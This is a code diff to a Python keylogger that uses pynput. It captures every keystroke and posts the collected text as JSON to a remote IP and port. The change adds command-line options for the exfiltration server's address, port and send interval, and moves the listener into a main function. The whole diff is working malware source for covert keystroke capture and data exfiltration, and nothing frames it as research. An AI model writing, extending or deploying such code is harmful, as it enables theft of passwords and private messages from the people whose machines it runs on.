@@ -2,13 +2,9 @@ from pynput import keyboard
 import requests
 import json
 import threading
+import optparse
 
-text = ""
-ip = ""
-port = ""
-interval = ""
-
-def post_request():
+def post_request(ip, port, interval=None):
     try:
         payload = json.dumps({"keyboardData": text})
         r = requests.post(f"http://{ip}:{port}", data=payload,
@@ -40,6 +36,26 @@ def key_down(key):
     else:
         text += str(key).strip("'")
 
-with keyboard.Listener(on_press=key_down) as listener:
-    post_request()
-    listener.join()
+
+def main():
+    parser = optparse.OptionParser("Usage: program.py -i <ip address> -p <port>")
+    parser.add_option('-i', dest='ip', type='string', help='Set the remote server IP')
+    parser.add_option('-p', dest='port', type='string', help='Set the remote server port.')
+    parser.add_option('--interval', dest='interval', type='string', help='Time interval between each thread. Default is 10 seconds.', default='10')
+    (options, args) = parser.parse_args()
+
+    ip = options.ip
+    port = options.port
+    interval = int(options.interval)
+
+    if ip == None or port == None:
+        print(parser.usage)
+        exit(0)
+
+    with keyboard.Listener(on_press=key_down) as listener:
+        post_request(ip, port, interval=interval)
+        listener.join()
+
+if __name__ == '__main__':
+    text = ""
+    main()
